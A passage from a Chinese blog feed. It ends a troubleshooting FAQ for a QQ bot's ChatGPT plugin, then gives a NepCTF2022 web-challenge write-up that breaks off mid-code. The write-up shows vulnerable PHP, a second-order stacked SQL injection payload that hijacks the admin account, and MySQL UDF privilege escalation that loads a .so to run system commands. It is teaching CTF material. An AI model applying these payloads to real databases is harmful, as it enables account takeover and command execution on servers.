class="language-bash"><span class="token function">git</span> stash <span class="token parameter variable">-p</span></code></pre><p>运行后进入交互界面</p><img src="/article/Yunzai-chatgptPlugin/image-20230220194247500.png" class="" title="image-20230220194247500" loading="lazy"><p>按<code>y</code>保存需要的内容，按n不保存，一般只需要注意下<code>config/index.js</code>的内容</p><p>保存后运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull</code></pre><p>拉好更新后再运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> stash pop</code></pre><p>将之前存储的更改复原，之后重启机器人即可</p><h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h2><h3 id="【system】ERR-PNPM-ADDING-TO-ROOT"><a href="#【system】ERR-PNPM-ADDING-TO-ROOT" class="headerlink" title="【system】ERR_PNPM_ADDING_TO_ROOT"></a>【system】ERR_PNPM_ADDING_TO_ROOT</h3><p>问题详情：Running this command will add the dependency to the workspace root</p><p>原因：依赖安装问题，添加依赖项到了根目录中</p><p>解决方式：检查命令是否出错以及权限问题</p><h3 id="【system】ERR-PNPM-UNEXPECTED-STORE"><a href="#【system】ERR-PNPM-UNEXPECTED-STORE" class="headerlink" title="【system】ERR_PNPM_UNEXPECTED_STORE"></a>【system】ERR_PNPM_UNEXPECTED_STORE</h3><p>问题详情：Unexpected store location</p><p>原因：迁移了node_modules的目录</p><p>解决方式：<code>pnpm install</code>重新安装依赖</p><h3 id="【system】Invalid-Environment"><a href="#【system】Invalid-Environment" class="headerlink" title="【system】Invalid Environment"></a>【system】Invalid Environment</h3><p>问题详情：Error: Invalid Environment; fetch is not defined</p><p>原因：node版本过低</p><p>解决方式：请升级到nodejs18</p><h3 id="【bot】载入插件错误：chat"><a href="#【bot】载入插件错误：chat" class="headerlink" title="【bot】载入插件错误：chat"></a>【bot】载入插件错误：chat</h3><p>问题详情：Error [ERR_MODULE_NOT_FOUND]: Cannot find package ‘showdown’ imported from &#x2F;app&#x2F;Yunzai-Bot&#x2F;plugins&#x2F;chatgpt-plugin&#x2F;apps&#x2F;chat.js</p><p>原因：没装依赖</p><p>解决方式：请参考文档用<code>pnmp install -w xxx</code>安装依赖，遇到的情况一般是<code>pnpm install -w undici chatgpt showdown mathjax-node delay uuid remark strip-markdown random puppeteer-extra-plugin-recaptcha puppeteer-extra puppeteer-extra-plugin-stealth @waylaidwanderer/chatgpt-api keyv-file</code>，安装完就不报错了</p><h3 id="【bot】chatgpt-puppeteer-启动失败"><a href="#【bot】chatgpt-puppeteer-启动失败" class="headerlink" title="【bot】chatgpt puppeteer 启动失败"></a>【bot】chatgpt puppeteer 启动失败</h3><p>问题详情：TypeError: this.browser.pages is not a function</p><p>原因：没有桌面环境</p><p>解决方式：请参照文档<a href="#%E3%80%90docker%E3%80%91chatGPT-Plugin%E6%83%B3%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%BC%8F%E6%80%8E%E4%B9%88%E5%8A%9E">安装桌面环境</a></p><h3 id="【bot】-10003"><a href="#【bot】-10003" class="headerlink" title="【bot】-10003"></a>【bot】-10003</h3><p>问题详情：Error: unsuccessful retcode: -10003</p><p>原因：登录失效</p><p>解决方式：重新登录bot，运行<code>node app</code>或<code>npm run login</code></p><h3 id="【bot】我的bot突然掉线再登录提示禁止登录-x2F-版本过低怎么办"><a href="#【bot】我的bot突然掉线再登录提示禁止登录-x2F-版本过低怎么办" class="headerlink" title="【bot】我的bot突然掉线再登录提示禁止登录&#x2F;版本过低怎么办"></a>【bot】我的bot突然掉线再登录提示禁止登录&#x2F;版本过低怎么办</h3><p>问题详情：[温馨提示]当前QQ版本过低，请升级至最新版本后再登录。点击进入下载页面</p><p>原因：Yunzai-bot的内置QQ版本与最新版本相差过大，且账号容易被风控</p><p>解决方式：不保证成功</p><ol><li>更改登录设备，在<code>config/qq.yaml</code>修改登录设备</li></ol><blockquote><p>注意：如果您是docker用户，在安装完（即执行完<code>docker-compose up -d</code>后，可以发现Yunzai-bot的目录下多了一个yunzai文件夹，这是Yunzai在编译的时候映射入docker容器内的文件夹，文件夹目录如下</p><pre class="language-none"><code class="language-none">yunzai├── config│   ├── bot.yaml│   ├── group.yaml│   ├── other.yaml│   ├── qq.yaml│   └── redis.yaml├── data│   ├── [你登录的qq号]│   │   └── device-[你登录的qq号].json│   ├── html│   └── image├── genshin_config├── logs└── plugins</code></pre><p>所有的文件修改请在此文件夹下修改，如我需要改<code>qq.yaml</code>，请勿在<code>Yunzai-Bot/config/qq.yaml</code>更改，而是在<code>Yunzai-Bot/yunzai/config/qq.yaml</code>修改！！！</p></blockquote><ol start="2"><li>尝试修改设备信息</li></ol><img src="/article/Yunzai-chatgptPlugin/e55c4bab_9454279.jpeg" class="" title="img" loading="lazy"><ol start="3"><li>膜一膜<a href="https://gitee.com/Le-niao/Yunzai-Bot">Le-niao</a>大佬更新下云崽</li></ol><h3 id="【docker】我执行docker-compose的时候报如下错误怎么办"><a href="#【docker】我执行docker-compose的时候报如下错误怎么办" class="headerlink" title="【docker】我执行docker compose的时候报如下错误怎么办"></a>【docker】我执行docker compose的时候报如下错误怎么办</h3><p>问题详情：ERROR: The Compose file ‘.&#x2F;docker-compose.yaml’ is invalid</p><img src="/article/Yunzai-chatgptPlugin/image-20230215214728708.png" class="" title="image-20230215214728708" loading="lazy"><p>原因：docker compose版本过低</p><p>解决方式：升级docker compose版本——<a href="https://docs.docker.com/compose/install/">重新下载plugin或standalone</a></p><h3 id="【docker】在docker-Running的过程中报如下错误怎么办"><a href="#【docker】在docker-Running的过程中报如下错误怎么办" class="headerlink" title="【docker】在docker Running的过程中报如下错误怎么办"></a>【docker】在docker Running的过程中报如下错误怎么办</h3><p>问题详情：Your kernel does not support swap limit capabilities or the cgroup is not mounted</p><img src="/article/Yunzai-chatgptPlugin/image-20230215215409836.png" class="" title="image-20230215215409836" loading="lazy"><p>原因：系统默认未开启swap内存限制</p><p>解决方式：编辑<code>/etc/default/grub file</code>，注意有<strong>两个文件</strong>，建议用vim</p><img src="/article/Yunzai-chatgptPlugin/image-20230215220014930.png" class="" title="image-20230215220014930" loading="lazy"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/default/grub <span class="token function">file</span></code></pre><p>添加一行，如果用vin需要按<code>:wq</code>后按回车再来一次保存</p><p><code>GRUB_CMDLINE_LINUX=&quot;cgroup_enable=memory swapaccount=1&quot;</code></p><p>执行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">update-grub</span></code></pre><p>执行完后重启系统</p><h3 id="【ChatGPT】timed-out"><a href="#【ChatGPT】timed-out" class="headerlink" title="【ChatGPT】timed out"></a>【ChatGPT】timed out</h3><p>问题详情：Error: ChatGPT timed out waiting for response</p><p>原因：卡了</p><p>解决方式：再试试</p><h3 id="【ChatGPT】ERR-ABORTED"><a href="#【ChatGPT】ERR-ABORTED" class="headerlink" title="【ChatGPT】ERR_ABORTED"></a>【ChatGPT】ERR_ABORTED</h3><p>问题详情：Error: net::ERR_ABORTED at <a href="https://chat.openai.com/auth/login">https://chat.openai.com/auth/login</a></p><p>原因：在恢复会话登录的时候失败了</p><p>解决方式：再试试</p><h3 id="【ChatGPT】ERR-CONNECTION-RESET"><a href="#【ChatGPT】ERR-CONNECTION-RESET" class="headerlink" title="【ChatGPT】ERR_CONNECTION_RESET"></a>【ChatGPT】ERR_CONNECTION_RESET</h3><p>问题详情：Error: net::ERR_CONNECTION_RESET at <a href="https://chat.openai.com/chat">https://chat.openai.com/chat</a></p><p>原因：1. 网络不好 2. 代理挂了</p><p>解决方式：重试或者换代理</p><h3 id="【ChatGPT】ERR-PROXY-CONNECTION-FAILED"><a href="#【ChatGPT】ERR-PROXY-CONNECTION-FAILED" class="headerlink" title="【ChatGPT】ERR_PROXY_CONNECTION_FAILED"></a>【ChatGPT】ERR_PROXY_CONNECTION_FAILED</h3><p>问题详情：Error: net::ERR_PROXY_CONNECTION_FAILED at <a href="https://chat.openai.com/chat">https://chat.openai.com/chat</a></p><p>原因：代理挂了</p><p>解决方式：检查代理配置</p><h3 id="【ChatGPT】ECONNRESET"><a href="#【ChatGPT】ECONNRESET" class="headerlink" title="【ChatGPT】ECONNRESET"></a>【ChatGPT】ECONNRESET</h3><p>问题详情：FetchError: request to <a href="https://chat.duti.tech/api/conversation">https://chat.duti.tech/api/conversation</a> failed, reason: read ECONNRESET</p><p>原因：连不上服务器</p><p>解决方式：检查代理</p><h3 id="【ChatGPT】Not-signed-in"><a href="#【ChatGPT】Not-signed-in" class="headerlink" title="【ChatGPT】Not signed in"></a>【ChatGPT】Not signed in</h3><p>问题详情：Error: Not signed in</p><p>原因：登录流程结束但是实际上未登录，一般是主机卡了一下，或者服务器capacity了</p><p>解决方式：再试试，一般要么就好了要么就会报其他的错 &#x3D; &#x3D;</p><img src="/article/Yunzai-chatgptPlugin/image-20230215234115777.png" class="" title="image-20230215234115777" loading="lazy"><h3 id="【ChatGPT】404-x2F-429-x2F-503"><a href="#【ChatGPT】404-x2F-429-x2F-503" class="headerlink" title="【ChatGPT】404&#x2F;429&#x2F;503"></a>【ChatGPT】404&#x2F;429&#x2F;503</h3><p>问题详情：Error: ChatGPTAPI error 404 &#x2F; Error: ChatGPTAPI error 429 &#x2F; Error: Failed to send message.HTTP 503…</p><p>原因：一般是服务器抽风，多数情况是代理被ban了，可能是请求太多，也可能是没钱了，具体要看返回的message</p><p>解决方式：1. 关了浏览器重开 2. 更换代理再试试 3. 钞能力</p><img src="/article/Yunzai-chatgptPlugin/image-20230215234728748.png" class="" title="image-20230215234728748" loading="lazy"><h3 id="【ChatGPT】capacity"><a href="#【ChatGPT】capacity" class="headerlink" title="【ChatGPT】capacity"></a>【ChatGPT】capacity</h3><p>问题详情：Error: ChatGPT is at capacity</p><p>原因：每天晚上固定时间忙碌</p><p>解决方式：尊贵的plus用户永远不会遇到此问题</p><p>待续…</p><hr><h3 id="【标签】问题标题"><a href="#【标签】问题标题" class="headerlink" title="【标签】问题标题"></a>【标签】问题标题</h3><p>问题详情：</p><p>原因：</p><p>解决方式：</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>还没想好，还会更新</p><p>原文地址：<a href="https://err0r.top/article/Yunzai-chatgptPlugin/">https://err0r.top/article/Yunzai-chatgptPlugin/</a></p><p>转载请注明作者和原文地址，谢谢！</p><h2 id="参考文章及感谢"><a href="#参考文章及感谢" class="headerlink" title="参考文章及感谢"></a>参考文章及感谢</h2><p><a href="https://gitee.com/Le-niao/Yunzai-Bot">Yunzai-Bot</a></p><p><a href="https://github.com/ikechan8370/chatgpt-plugin">chatGPT-Plugin作者</a></p><p><a href="https://www.ahdark.com/som/1643.shtml">使用 Clash 为 Linux 提供网络代理服务</a></p><p>所有在chatGPT-Plugin插件群的群友们，爱你们～</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2022博学多闻的花花WP&amp;出题笔记</title>
      <link href="article/eruditeFlower/"/>
      <url>article/eruditeFlower/</url>
      
        <content type="html"><![CDATA[<p>NepCTF2022 Web题·博学多闻的花花 WP&amp;出题笔记</p><span id="more"></span><p>我先摆个链接，诶 被坏女人催写wp，先挖个坑在这啦 <a href="https://err0r.top/article/eruditeFlower/">https://err0r.top/article/eruditeFlower/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这道题目的原型是我的动态Web课设，随随便便撸了个课设，然后NepCTF开始筹备了，在写数据库操作的时候发现像这样一个动态抽取题目答题的网站，如果安全没做好的话肯定一堆漏洞(<del>事实上课设最后答辩我看了下全是漏洞，但毕竟只是一个开发的课设</del>)。联想到国内近一年来的ctf题目，很少有考到二次注入的，因为大多数的情况下采用的是限制性原则，即过滤&#x2F;匹配替换等限制字符串，并没有转义字符这样的操作，恰恰就是因为这样做如果没有限制好参数就会产生二次注入的漏洞，我将这点和课设中multi_query操作进行结合，再加上ctf中更加罕见的udf提权操作，出了一道题目，希望师傅们能理解其中的意义。</p><p>前排指路：</p><p><a href="#exp">exp</a></p><p>如果不想看wp想看我吹水的可以看<a href="#Q&A">Q&amp;A</a></p><p>包括一些避免搅shi，出题时遇到的问题和反作弊对抗的事情，凡事总有第一次，希望能给后面出题的师傅们一些帮助</p><h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write-Up"></a>Write-Up</h2><h3 id="二次-堆叠注入获取admin"><a href="#二次-堆叠注入获取admin" class="headerlink" title="二次+堆叠注入获取admin"></a>二次+堆叠注入获取admin</h3><p>根据源码在<code>login.php</code>的28-30行，用户登录后session存储了<code>username</code>和<code>studentid</code>的源数据</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>之后在<code>index.php</code>的183-184行可以看到在存储用户答案的时候，没有对传入的参数(<code>$_SESSION[&#39;username&#39;]</code>)进行过滤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into score values (NULL, '"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"', <span class="token interpolation"><span class="token variable">$getscroe</span></span>);insert into userAnswer values (NULL, '"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q2'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q3'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q4'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q5'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"')"</span><span class="token punctuation">;</span></code></pre><p>这里由于一点点小问题导致没有对q1-5进行合法性验证，所以导致在这里即可直接使用堆叠注入进行下一步操作，这里的考点是二次注入，利用<code>username</code>进行堆叠注入，修改admin的<code>studentid</code>，从而登录获取admin。由于增加revenge会导致原有分数结构被破坏<del>(咱就是个新生赛)</del>，因此比赛过程中就没有对题目做修改啦。</p><p><strong>现题目已经修改完毕，增加了对q1-5的合法性验证，无法在q1-5处进行注入了，附件也将会同步更新。</strong></p><p>因为通篇来看，只有这处未对<code>username</code>转义，而且此处进行了<code>multi_query</code>，所以可以如果此处存在注入点的话就可以进行堆叠注入。</p><p>首先尝试闭合，可以看到如果我的username为</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;1&#39;);update users set studentid&#x3D;&#39;&#123;passwd&#125;&#39; where username&#x3D;&#39;admin&#39;;</code></pre><p>那么执行的sql语句就变成了这样</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">...;insert into userAnswer values (NULL, &#39;a&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;1&#39;);update users set studentid&#x3D;&#39;admin_passwd&#39; where username&#x3D;&#39;admin&#39;;#&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;)&quot;;</code></pre><p>执行后就更改了admin的<code>studentid</code>为<code>admin_passwd</code>，就可以登录到<code>score.php</code>了。</p><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>根据附件<code>init.sql</code>，ctf用户拥有<code>*.*</code>的<code>file</code>和<code>insert</code>权限</p><img src="/article/eruditeFlower/image-20220718201604798.png" class="" title="image-20220718201604798" loading="lazy"><p>(这里score库的权限配给进行过修改，原因是有人搞事，这个会在后面的出题笔记中细说)</p><p>同时根据附件给的<code>my.cnf</code>，配置文件都是默认配置，且<code>secure-file-priv</code>直接给到了plugin目录下</p><img src="/article/eruditeFlower/image-20220718201827284.png" class="" title="image-20220718201827284" loading="lazy"><p>且<code>init.sql</code>的<code>score.ctf</code>表也写明了<code>flag_in_/flag</code>，要么通过读取文件的方式将flag读入获取，要么udf提权，操作系统函数。</p><h4 id="写入-so文件"><a href="#写入-so文件" class="headerlink" title="写入.so文件"></a>写入.so文件</h4><p>由于服务器是linux-x64，在github选取合适的.so文件或者自己编译，本地使用select获取其hex值。</p><p><code>select hex(load_file(&#39;/usr/lib64/mysql/plugin/exp.so&#39;))</code>得到值如下</p><pre class="language-hex" data-language="hex"><code class="language-hex">0x7F454C460201...</code></pre><p>太长了，exp里有写，这里就不再展示了</p><p>在<code>score.php</code>的54-55行，由于本页面对admin开放，所以没有进行可信验证，直接存在注入。</p><p>同样利用二次注入，先闭合后使用dump file写入.so文件</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;select &lt;0x7F...&gt; into dumpfile &#39;&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin&#x2F;exp.so&#39;;#</code></pre><h4 id="创建udf"><a href="#创建udf" class="headerlink" title="创建udf"></a>创建udf</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;exp.so&#39;;#</code></pre><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;select sys_eval(&#39;id&#39;);#</code></pre><h3 id="最终步骤"><a href="#最终步骤" class="headerlink" title="最终步骤"></a>最终步骤</h3><p>这里直接弹个shell回来，直接<code>cat /flag</code>，没有权限，寻找有suid位的程序curl，执行<code>curl file:///flag</code>获得flag</p><img src="/article/eruditeFlower/image-20220718203220152.png" class="" title="image-20220718203220152" loading="lazy"><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="分析网站流程"><a href="#分析网站流程" class="headerlink" title="分析网站流程"></a>分析网站流程</h3><p>首先打开是主界面(index.php)，有注册(register.php)，登录(login.php)，查询(score.php)和排名(rank.php)四个界面。</p><img src="/article/eruditeFlower/image-20220718194746609.png" class="" title="image-20220718194746609" loading="lazy"><p>注册和登录都非常的朴实无华，没啥好说的</p><img src="/article/eruditeFlower/image-20220718194810642.png" class="" title="image-20220718194810642" loading="lazy"><img src="/article/eruditeFlower/image-20220718194821729.png" class="" title="image-20220718194821729" loading="lazy"><h4 id="register"><a href="#register" class="headerlink" title="register"></a>register</h4><p>按流程首先看看注册</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'你想干啥？'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string single-quoted-string">'提交'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"搞事搞事搞事.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span></code></pre><p>如果post了<code>username</code>和<code>studentid</code>那么就进入了注册流程，判断<code>$username===&#39;admin&#39;</code>，这里有个小插曲，原先写的是<code>==</code>导致可以直接%00截断，这个问题在下面会说</p><p>然后就是注册流程了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something err0r!&lt;br>姓名或学号重复"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>结合一下<code>init.sql</code>文件看一下</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token punctuation">(</span>  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">mediumtext</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">UNIQUE</span> <span class="token keyword">KEY</span> <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">11</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre><p>可以看到在.sql文件中<code>studentid</code>是唯一的，所以重复就会报错</p><p>接下来就是注册了，配合注释食用～</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 在插入前先查一下users表是否有此$studentid</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// $result->num_rows如果有任何值，那就表示重复了</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"用户已存在\");&lt;/script>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这里是选题操作，首先count一下题库数量，然后随机选5道题目出来</span>    <span class="token variable">$arrend</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select count(*) from challengesAll"</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fetch_row</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token variable">$arrend</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 两句insert堆叠，由于$username和$studentid都经过转义处理了，所以不会存在注入的情况发生，当然 真的吗？</span>    <span class="token comment">// 这一句是插入用户</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users values (NULL, '<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$studentid</span></span>');"</span><span class="token punctuation">;</span>    <span class="token comment">// 这一句是插入用户和随机到的题目，每个用户题目是在注册的同时就选定好并插入到randChallenges表中的</span>    <span class="token variable">$query</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"insert into randChallenges values (NULL, '<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span></span>', '<span class="token interpolation"><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span></span>');"</span><span class="token punctuation">;</span>    <span class="token comment">// 成功后跳转login界面</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">multi_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something error！"</span><span class="token operator">.</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><p>还是一样，首先判断是否登录，登录过了就跳回主界面，post俩参数就进入登录流程，配合注释食用～</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 